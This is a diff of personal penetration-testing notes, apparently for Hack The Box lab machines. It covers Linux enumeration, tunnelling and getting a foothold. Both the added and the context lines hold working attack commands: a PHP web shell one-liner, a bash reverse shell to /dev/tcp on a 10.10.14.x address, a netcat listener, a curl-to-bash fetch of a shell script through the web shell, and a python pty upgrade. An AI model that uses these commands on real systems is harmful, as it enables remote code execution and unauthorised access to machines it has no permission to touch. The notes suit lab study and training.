@@ -1,3 +1,5 @@
+https://gtfobins.github.io/
+
 # Linux
 
 ## Recon enumeration
@@ -18,6 +20,7 @@ gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000
 
 ```
 id
+sudo -l
 ss -tln // skip service names
 ss -tl 
 ss -tlpn
@@ -105,13 +108,13 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 http://thetoppers.htb/shell.php?cmd=id
 
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.14.23/1337 0>&1
+bash -i >& /dev/tcp/10.10.14.116/4444 0>&1
 
 nc -nvlp 1337
 
 http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.23:8000/rs.sh|bash
 python3 -m http.server 8000
-
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 #tunneling 
 local port forwarding
